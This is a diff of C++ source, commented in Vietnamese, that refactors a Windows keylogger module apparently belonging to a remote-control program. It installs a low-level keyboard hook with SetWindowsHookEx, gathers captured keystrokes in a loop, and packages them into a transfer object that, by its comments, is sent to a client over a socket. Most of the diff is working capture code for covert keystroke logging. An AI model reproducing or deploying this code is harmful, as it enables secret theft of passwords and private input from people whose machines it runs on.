@@ -1,23 +1,4 @@
-﻿#include "KLG_Obj.h"
-#include "DataObj.h"
-/*
-std::string KLG_Obj::keylogger()
-{
-	std::string result = "";
-	while (!checkStopSignal())
-	{
-		if (_kbhit())
-		{
-			char ch = _getch();
-			result += ch;
-		}
-	}
-	
-	return result;
-}
-*/
-
-
+#include "KLG_Func.h"
 
 LRESULT KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
@@ -38,18 +19,11 @@ LRESULT KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 	return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
-std::string KLG_Obj::toString()
+DataObj* KLG_Func::keylogger()
 {
-	return std::string();
-}
+    std::string res = "";
+    DataObj* MES = new KLG_TransferObj(DataType::RESPONSE, CmdType::START, res);
 
-std::string KLG_Obj::toFile(std::string filename)
-{
-	return std::string();
-}
-
-std::string KLG_Obj::keylogger()
-{
 	// Thiết lập hook để bắt sự kiện phím
 	HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
 	// Nếu không thiết lập hook thành công, báo lỗi và thoát chương trình
@@ -59,40 +33,41 @@ std::string KLG_Obj::keylogger()
 		
 		// Đóng socket và giải phóng thư viện Winsock
 		// ...
-
-		return "Hook failed.";
+        
+		res = "Hook failed.";
 	}
+    else
+    {
+        while (!checkStopSignal())
+        {
+            // Nếu đã bắt được ít nhất một phím, gửi danh sách các phím đã bắt được đến client
+            if (!keylog.empty())
+            {
+                // Ghép các phím đã bắt được thành một chuỗi
+                for (auto key : keylog)
+                {
+                    res += (char(key));
+                }
 
-	while (!checkStopSignal())
-	{
-		// Nếu đã bắt được ít nhất một phím, gửi danh sách các phím đã bắt được đến client
-		if (!keylog.empty())
-		{
-			// Ghép các phím đã bắt được thành một chuỗi
-			for (auto key : keylog)
-			{
-				_data.push_back(char(key));
-			}
+                // Xóa danh sách các phím đã bắt được
+                keylog.clear();
+            }
 
-			// Xóa danh sách các phím đã bắt được
-			keylog.clear();
-		}
+            // Chờ 1 giây trước khi kiểm tra lại
+            Sleep(1000);
+        }
 
-		// Chờ 1 giây trước khi kiểm tra lại
-		Sleep(1000);
-	}
+        // Huỷ hook
+        UnhookWindowsHookEx(hook);
+    }
 
-	// Huỷ hook
-	UnhookWindowsHookEx(hook);
+    MES->setData(res);
 	
-	// Đóng socket và giải phóng thư viện Winsock
-	// ...
-
-	return "Success";
+	return MES;
 }
 
 
-bool KLG_Obj::checkStopSignal()
+bool KLG_Func::checkStopSignal()
 {
 	DataObj stopSignal;
 
